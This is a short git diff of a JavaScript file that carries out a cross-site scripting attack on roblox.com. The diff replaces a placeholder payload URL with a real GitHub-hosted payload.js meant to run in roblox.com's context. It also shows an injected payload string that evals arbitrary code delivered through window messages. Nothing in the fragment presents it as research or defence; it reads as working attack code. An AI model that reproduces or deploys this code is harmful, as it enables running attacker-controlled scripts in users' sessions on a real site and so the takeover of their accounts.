@@ -3,7 +3,7 @@ var fcXssWindow
  
 // this is the script that will get executed in the context of roblox.com
 // make sure necessary CORS headers are present
-var robloxContextPayloadUrl = "https://malicious.com/payload.js"
+var robloxContextPayloadUrl = "https://raw.githubusercontent.com/N5F/fantastic-octo-telegram/main/payload.js"
  
 function getFcXssUrl() {
     var payload = "window.onmessage=e=>eval(e.data.f)(e.data.args)"
